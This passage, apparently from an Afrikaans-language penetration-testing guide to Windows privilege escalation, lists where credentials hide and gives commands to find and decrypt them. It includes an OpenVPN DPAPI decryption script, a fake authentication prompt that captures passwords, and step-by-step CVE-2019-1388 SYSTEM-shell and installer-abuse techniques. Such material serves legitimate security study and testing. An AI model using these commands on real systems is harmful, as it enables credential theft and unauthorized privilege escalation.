Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Dit lyk asof hierdie tegniek nie meer geldig is nie. Ek het probeer om ’n paar ssh keys te skep, dit met `ssh-add` by te voeg en via ssh by ’n masjien aan te meld. Die registerinskrywing HKCU\Software\OpenSSH\Agent\Keys bestaan nie, en procmon het nie die gebruik van `dpapi.dll` tydens asimmetriese-sleutelverifikasie geïdentifiseer nie.

### Onbewaakte lêers

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Jy kan ook met **metasploit** vir hierdie lêers soek: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- en SYSTEM-rugsteunkopieë

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Leesbare Windows Imaging (`.wim`)-rugsteunlêers kan ook vanlyn `SAM`-, `SECURITY`- en `SYSTEM`-korwe bevat. Gee plaaslik toeganklike rugsteun- of image-gidse voorkeur en ondersoek die image se **lêername** voordat jy enigiets uittrek; ’n `.wim`-lêernaam alleen bewys nie dat korwe blootgestel word nie, en gewone `install.wim`-, `boot.wim`- en herstel-images is algemene vals leidrade. ’n SMB-share is ’n aparte toegangspad en moet slegs nagegaan word wanneer daardie share binne die omvang val. Sien Microsoft se [riglyne vir Windows-images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) en [verwysing na registerkorflêers](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Wolk-aanmeldbewyse

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Soek na ’n lêer met die naam **SiteList.xml**

### GPP-wagwoord in kas

Daar was voorheen ’n funksie beskikbaar waarmee pasgemaakte plaaslike administrateurrekeninge op ’n groep masjiene via Group Policy Preferences ontplooi kon word. Hierdie metode het egter beduidende sekuriteitsfoute gehad. Eerstens kon enige domeingebruiker toegang kry tot die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is. Tweedens kon enige geverifieerde gebruiker die wagwoorde in hierdie GPPs dekripteer, wat met AES256 en ’n publiek gedokumenteerde versteksleutel geënkripteer is. Dit het ’n ernstige risiko ingehou, aangesien dit gebruikers verhoogde voorregte kon gee.

Om hierdie risiko te verminder, is ’n funksie ontwikkel om te soek na plaaslik gekaste GPP-lêers met ’n nie-leë "cpassword"-veld. Wanneer so ’n lêer gevind word, dekripteer die funksie die wagwoord en gee dit ’n pasgemaakte PowerShell-objek terug. Hierdie objek bevat besonderhede oor die GPP en die ligging van die lêer, wat help om hierdie sekuriteitskwesbaarheid te identifiseer en reg te stel.

Soek na hierdie lêers in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Om die cPassword te dekripteer:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Gebruik crackmapexec om die wagwoorde te kry:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS-webkonfigurasie

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Voorbeeld van web.config met aanmeldbesonderhede:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Rugsteunargiewe in ’n IIS-webroot

’n Ou ZIP-rugsteun wat direk in ’n webroot geplaas is wat bedien word, kan vorige konfigurasielêers en herbruikbare geloofsbriewe blootlê. Gaan die werf se ingestelde fisiese pad na en bevestig of die argief werklik via HTTP bereikbaar is voordat jy dit as ’n blootstelling beskou. Die verstekpad `C:\inetpub\wwwroot` is slegs ’n moontlikheid. ’n Vinnige plaaslike inventaris kan name en groottes lys sonder om argiewe oop te maak:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

’n Argiefnaam bewys nie dat dit ’n geheim bevat of dat ’n herwonne aanmeldbesonderheid hoër voorregte verleen nie.

### OpenVPN-aanmeldbesonderhede

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logboeke

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Vra vir aanmeldbesonderhede

Jy kan altyd **die gebruiker vra om sy aanmeldbesonderhede of selfs dié van ’n ander gebruiker in te voer** as jy dink hy ken dit (let daarop dat dit baie **riskant** is om die kliënt direk vir die **aanmeldbesonderhede** te **vra**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Moontlike lêername wat aanmeldbesonderhede bevat**

Bekende lêers wat vroeër **wagwoorde** in **helderteks** of Base64 bevat het

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-databasisse gebruik gewoonlik die `.psafe3`-uitbreiding. Beskou ’n lêernaam wat hiermee ooreenstem as ’n kandidaat vir ’n geënkripteerde kluis; die teenwoordigheid daarvan bewys nie dat jy dit kan lees, ontsluit of enige gestoorde aanmeldbesonderhede kan gebruik nie. Gaan toeganklike gebruikersprofiele en gekonfigureerde lêerdelingwortels na wanneer jy kyk waar sulke lêers gestoor word.

’n Leesbare KeePass `.kdbx` is eweneens net ’n leidraad na ’n geënkripteerde kluis. Om dit te ontsluit, benodig jy die werklike hoofwagwoord en enige gekonfigureerde sleutellêer- of rekeningfaktore. As ’n gemagtigde ondersoek ’n LM:NT-hashpaar in ’n inskrywing vind, verifieer die benoemde rekening en of die NT-hash nog geldig is en deur die teiken se NTLM-diens aanvaar word voordat jy [pass-the-hash](../ntlm/README.md#pass-the-hash) oorweeg. ’n Kluisinskrywing verleen nie op sigself Administrator- of SYSTEM-regte nie; afstandtoegang tot dienste, rekeningregte en enige afsonderlike stap vir diensuitvoering moet ook beskikbaar wees. Inventarisering moet die kluispad en leesbaarheid rapporteer, nie die databasis of gestoorde aanmeldbesonderhede vertoon nie.

Soek al die voorgestelde lêers:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Geloofsbriewe in die RecycleBin

Gaan toeganklike inskrywings in die Recycle Bin na vir geskrapte rugsteunlêers en konfigurasie-argiewe, asook lêers waarvan die name uitdruklik na geloofsbriewe verwys. ’n Nuttige `.7z`-, `.zip`- of `.rar`-rugsteunlêer kan maande oud wees en ’n gewone lêernaam hê. Windows stoor die oorspronklike pad en skraptyd in ’n `$I`-rekord, en die geskrapte lêer as die gepaarde `$R`-inskrywing; ondersoek die metadata en die huidige identiteit se leestoegang voordat jy ’n argief oopmaak. Sigbaarheid hang af van die volume, gebruikers-SID en lêertoestemmings, so ’n leë lys bewys nie dat geen herstelbare rugsteunlêer bestaan nie. Beskou ’n argiefnaam as ’n kandidaat vir ondersoek, nie as bewys dat dit ’n geldige geheim bevat nie.

’n Toeganklike geskrapte `.pfx` kan ook ’n **code-signing**-leidraad wees. As dit ’n toeganklike private sleutel bevat, kan die sleutel ’n gewysigde PowerShell-skrip onderteken; [PowerShell vereis ’n code-signing-sertifikaat met ’n private sleutel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), en [AppLocker-publiseerderreëls evalueer die ondertekenaar se identiteit en reëlomvang](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Uitvoering oor rekeninge heen vereis dat die huidige identiteit die presiese skrip kan wysig, dat ’n geldige reël die gevolglike handtekening vir die skrip en teikenrekening aanvaar, en dat ’n geskeduleerde taak of ander verbruiker met hoër voorregte dit werklik uitvoer. ’n `.pfx`-lêernaam, sertifikaatonderwerp of skryfbare skrip alleen bewys nie dat die hele ketting bestaan nie. Ondersoek die metadata, ACL’s, beleid en geskeduleerde opdrag voordat jy private-sleutelmateriaal oopmaak of die taak aktiveer.

Ondersoek ook toeganklike profieldatabasisse, notas en ontvangde lêers van boodskaptoepassings vir leidrade oor geloofsbriewe. ’n BitLocker-herstelsleutelksporing kan as HTML of TXT gestoor wees, soms binne ’n benoemde rugsteunargief. Sulke materiaal kan toegang bied tot ’n afsonderlike geënkripteerde datavolume wat ouer rugsteunlêers bevat; ondersoek die volume en argief slegs wanneer toegang gemagtig is. As ’n rugsteunlêer `NTDS.dit` bevat, vereis vanlyn domeingeloofsbriefherstel ook die bypassende `SYSTEM`-hive, soos beskryf in die [werkvloei vir rugsteunlêers en bevoorregte groepe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Lêername en ’n geslote volume bewys op sigself nie dat ’n bruikbare herstelsleutel of domeinrugsteun bestaan nie.

Om wagwoorde wat deur verskeie programme gestoor is te **herstel**, kan jy die volgende gebruik: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Binne die register

**Ander moontlike registersleutels met geloofsbriewe**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Onttrek openssh-sleutels uit die register.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Blaaiergeskiedenis

Jy moet kyk vir databasisse waarin wagwoorde van **Chrome, Edge of Firefox** gestoor word.\
Kyk ook na die blaaiergeskiedenis, boekmerke en gunstelinge, aangesien daar dalk **wagwoorde gestoor is**.

Vir die huidige gebruiker se gewone Edge-**Default**-profiel is `Login Data` onder `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, terwyl `Local State` in die ouergids `User Data` is. [Microsoft dokumenteer die verstekprofiel se ligging](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ’n ander profiel of ’n `UserDataDir`-beleid kan dit verskuif. Die teenwoordigheid van die lêer dui slegs op ’n moontlike plek waar geloofsbriewe gestoor word: bevestig dat die lêers leesbaar is, dat jy toegang het tot die toepaslike gebruiker se DPAPI-konteks of ander gemagtigde sleutelmateriaal, en dat ’n gestoorde aanmelding aan ’n rekening met hoër voorregte behoort. Om slegs paaie te lys, vereis nie dat jy die databasis oopmaak of ontsyferde wagwoorde vertoon nie.

Vir Firefox dokumenteer [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) dat ’n profiel se `key4.db` en `logins.json` die gepaarde sleutel- en geënkripteerde-aanmeldingslêers is. Die teenwoordigheid daarvan is slegs ’n aanduiding: kyk of albei lêers leesbaar is, of gestoorde inskrywings bestaan en of ’n Primary Password die sleutel beskerm voordat jy besluit dat die geloofsbriewe bruikbaar is. As ’n herwonne geloofsbrief aan ’n domeinrekening behoort, moet jy daardie rekening se effektiewe groepbeheerregte en die groep se [LAPS-regte om wagwoorde te lees of te dekripteer](../active-directory-methodology/laps.md) afsonderlik nagaan; blaaierartefakte alleen bewys nie dat daar ’n pad na administrateurvoorregte is nie.

Gereedskap om wagwoorde uit blaaiers te onttrek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** is ’n tegnologie wat in die Windows-bedryfstelsel ingebou is en **kommunikasie** tussen sagtewarekomponente wat in verskillende tale geskryf is, moontlik maak. Elke COM-komponent word **deur ’n klas-ID (CLSID) geïdentifiseer**, en elke komponent stel funksionaliteit deur een of meer koppelvlakke beskikbaar, wat deur koppelvlak-ID’s (IID’s) geïdentifiseer word.

COM-klasse en -koppelvlakke word onderskeidelik in die register onder **HKEY\CLASSES\ROOT\CLSID** en **HKEY\CLASSES\ROOT\Interface** gedefinieer. Hierdie register word geskep deur **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** saam te voeg tot **HKEY\CLASSES\ROOT.**

Binne die CLSID’s van hierdie register kan jy die kindregister **InProcServer32** vind. Dit bevat ’n **verstekwaarde** wat na ’n **DLL** wys, en ’n waarde genaamd **ThreadingModel** wat **Apartment** (enkel-threaded), **Free** (multi-threaded), **Both** (enkel- of multi-threaded) of **Neutral** (thread-neutraal) kan wees.

![Blaaiergeskiedenis - COM DLL Overwriting: Binne die CLSID’s van hierdie register kan jy die kindregister InProcServer32 vind. Dit bevat ’n verstekwaarde wat na ’n DLL wys, en ’n waarde...](<../../images/image (729).png>)

Basies, as jy **enige van die DLL’s wat uitgevoer gaan word, kan oorskryf**, kan jy **voorregte eskaleer** as daardie DLL deur ’n ander gebruiker uitgevoer gaan word.

Lees die volgende om te leer hoe aanvallers COM Hijacking as ’n volhardingsmeganisme gebruik:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Algemene soektog na wagwoorde in lêers en die register**

**Soek deur lêerinhoud**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Soek na 'n lêer met 'n bepaalde lêernaam**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Soek die register vir sleutelname en wagwoorde**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Gereedskap wat na wagwoorde soek

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is ’n msf**-plugin wat ek geskep het om **elke Metasploit POST-module wat na geloofsbriewe op die slagoffer soek, outomaties uit te voer**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) soek outomaties na al die lêers met wagwoorde wat op hierdie bladsy genoem word.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) is nog ’n uitstekende hulpmiddel om wagwoorde uit ’n stelsel te onttrek.

Die hulpmiddel [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) soek na **sessies**, **gebruikersname** en **wagwoorde** vir verskeie hulpmiddels wat hierdie data in clear text stoor (PuTTY, WinSCP, FileZilla, SuperPuTTY en RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stel jou voor dat **’n proses wat as SYSTEM loop ’n nuwe proses** (`OpenProcess()`) **met volle toegang oopmaak**. Dieselfde proses **skep ook ’n nuwe proses** (`CreateProcess()`) **met lae voorregte, maar wat al die oop handles van die hoofproses erf**.\
As jy dan **volle toegang tot die proses met lae voorregte het**, kan jy die **oop handle na die bevoorregte proses wat met** `OpenProcess()` **geskep is, bekom** en **shellcode inspuit**.\
[Lees hierdie voorbeeld vir meer inligting oor **hoe om hierdie kwesbaarheid op te spoor en uit te buit**.](leaked-handle-exploitation.md)\
[Lees hierdie **ander plasing vir ’n vollediger verduideliking van hoe om meer oop handles van prosesse en threads te toets en te misbruik wat met verskillende toestemmingsvlakke geërf is (nie net volle toegang nie)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gedeelde geheuesegmente, wat as **pipes** bekend staan, maak kommunikasie en data-oordrag tussen prosesse moontlik.

Windows bied ’n funksie genaamd **Named Pipes**, wat onverwante prosesse toelaat om data te deel, selfs oor verskillende netwerke. Dit lyk soos ’n kliënt/bediener-argitektuur, met rolle wat as **named pipe-bediener** en **named pipe-kliënt** gedefinieer word.

Wanneer ’n **kliënt** data deur ’n pipe stuur, kan die **bediener** wat die pipe opgestel het, die **identiteit van die kliënt aanneem**, mits dit die nodige **SeImpersonate**-regte het. As jy ’n **bevoorregte proses** identifiseer wat kommunikeer via ’n pipe wat jy kan naboots, kry jy die geleentheid om **hoër voorregte te verkry** deur die identiteit van daardie proses aan te neem wanneer dit met die pipe wat jy opgestel het, kommunikeer. Nuttige gidse met instruksies oor hoe om so ’n aanval uit te voer, is [**hier**](named-pipe-client-impersonation.md) en [**hier**](#from-high-integrity-to-system).

Die volgende hulpmiddel laat jou ook toe om **’n named pipe-kommunikasie met ’n hulpmiddel soos burp te onderskep:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **en hierdie hulpmiddel laat jou toe om al die pipes te lys en te sien om privescs te vind** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv-afgeleë DWORD-skryf na RCE

Die Telephony-diens (TapiSrv) stel in bedienermodus `\\pipe\\tapsrv` (MS-TRP) beskikbaar. ’n Afgeleë, geverifieerde kliënt kan die mailslot-gebaseerde asinkrone gebeurtenisroete misbruik om `ClientAttach` in ’n arbitrêre **4-byte-skryf** na enige bestaande lêer wat deur `NETWORK SERVICE` geskryf kan word, te omskep. Daarna kan die kliënt Telephony-adminregte verkry en ’n arbitrêre DLL as die diens laai. Volledige proses:

- `ClientAttach` met `pszDomainUser` ingestel op ’n bestaande, skryfbare pad → die diens maak dit met `CreateFileW(..., OPEN_EXISTING)` oop en gebruik dit vir asinkrone gebeurtenisskrywe.
- Elke gebeurtenis skryf die aanvaller-beheerde `InitContext` van `Initialize` na daardie handle. Registreer ’n lynprogram met `LRegisterRequestRecipient` (`Req_Func 61`), aktiveer `TRequestMakeCall` (`Req_Func 121`), haal dit met `GetAsyncEvents` (`Req_Func 0`) op, en registreer dan af of sluit af om deterministiese skrywe te herhaal.
- Voeg jouself by `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, koppel weer, en roep dan `GetUIDllName` met ’n arbitrêre DLL-pad aan om `TSPI_providerUIIdentify` as `NETWORK SERVICE` uit te voer.

Meer besonderhede:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Diverse

### Lêeruitbreidings wat dinge in Windows kan uitvoer

Kyk na die bladsy **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute-misbruik via Markdown-renderers

Klikbare Markdown-skakels wat na `ShellExecuteExW` aangestuur word, kan gevaarlike URI-handlers (`file:`, `ms-appinstaller:` of enige geregistreerde skema) aktiveer en aanvaller-beheerde lêers as die huidige gebruiker uitvoer. Sien:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitering van opdragreëls vir wagwoorde**

Wanneer jy ’n shell as ’n gebruiker kry, kan daar geskeduleerde take of ander prosesse wees wat **geloofsbriewe op die opdragreël deurgee**. Die onderstaande script vang elke twee sekondes prosesopdragreëls vas, vergelyk die huidige toestand met die vorige toestand en voer enige verskille uit.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wagwoorde uit prosesse steel

## Van gebruiker met lae voorregte na NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

As jy toegang tot die grafiese koppelvlak het (via konsole of RDP) en UAC geaktiveer is, is dit in sommige weergawes van Microsoft Windows moontlik om ’n terminaal of enige ander proses as "NT\AUTHORITY SYSTEM" vanaf ’n gebruiker sonder voorregte te laat loop.

Dit maak dit moontlik om voorregte te eskaleer en terselfdertyd UAC te omseil met dieselfde kwesbaarheid. Daarbenewens hoef niks geïnstalleer te word nie, en die binêre lêer wat tydens die proses gebruik word, is deur Microsoft onderteken en uitgereik.

Sommige van die geaffekteerde stelsels is die volgende:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Om hierdie kwesbaarheid uit te buit, moet die volgende stappe uitgevoer word:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Jy het al die nodige lêers en inligting in hierdie GitHub-bewaarplek:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Van Administrator Medium na High Integrity Level / UAC-omseiling

Lees dit om **meer oor Integrity Levels te leer**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan **dit om meer oor UAC en UAC-omseilings te leer:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Oplaai-gidsaansluitings na 'n webbediende wortelgids

'n Toepassing kan 'n voorspelbare oplaai-subgids skep, 'n lêernaam wat deur die oproeper verskaf is daarin skryf en dan die lêer verwerk. As 'n gebruiker met lae voorregte daardie subgids kan verwyder en vervang met 'n NTFS-junction voordat die bedienerkant-skryf plaasvind, kan die skryfaksie die junction volg tot in 'n webbediende gids. 'n Skrip wat daar geplaas word, kan as die webdiens-identiteit loop as die bediener daardie lêertipe uitvoer. Dit is 'n toepassingspesifieke grens vir arbitrêre skryfregte; 'n skryfbare oplaai-gids of 'n bestaande junction bewys dit nie op sigself nie.

Kontroleer die presiese padopbou en tydsberekening in die oplaai-hanteerder, die gebruiker se effektiewe regte om die subgids te skrap en te skep, die bestemming se effektiewe ACL's, of die skrywer reparse points volg, en of die webbediener lêers in daardie bestemming uitvoer. Bevestig die skrywer en webbediener se prosesidentiteite afsonderlik. Passiewe inventarisering kan gids-ACL's en reparse-metadata wys, maar kan nie die hanteerder se gedrag of 'n toekomstige junction-vervanging vasstel nie. As uitvoering in 'n diensrekening plaasvind, ondersoek die **werklike prosestoken** voordat jy enige afsonderlike tokenvoorregte-roete oorweeg.

## Van arbitrêre gidsverwydering/-verskuiwing/-hernoeming na SYSTEM EoP

Die tegniek wat beskryf word [**in hierdie blogplasing**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), met uitbuitingskode [**hier beskikbaar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Die aanval bestaan basies uit die misbruik van Windows Installer se terugrolfunksie om wettige lêers met kwaadwillige lêers te vervang tydens die deïnstallasieproses. Hiervoor moet die aanvaller 'n **kwaadwillige MSI-installeerder** skep wat gebruik sal word om die `C:\Config.Msi`-gids te kaap. Windows Installer sal hierdie gids later gebruik om terugrollêers te stoor tydens die deïnstallasie van ander MSI-pakkette, waar die terugrollêers gewysig sou word om die kwaadwillige loonvrag te bevat.

### Windows Installer COM-inspuiting van die skoonmaakpad (CVE-2025-27727)

'n Kliënt met lae voorregte kan die SYSTEM-`msiexec.exe`-diens bereik deur die `CMsiConfigurationManager` COM-objek (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Omgekeerde ingenieurswese het die relevante `IMsiServer`-oproepe geïdentifiseer as `MsiBeginTransactionW` by vtable-offset `0xA0`, `SetEEUIDirectoryAndFilter` by `0xC8`, en `CleanupTempPackages` by `0x50`. Hierdie name en offsets is deur omgekeerde ingenieurswese bepaal en kan tussen builds verskil.<sup>[[41]](#references)</sup>

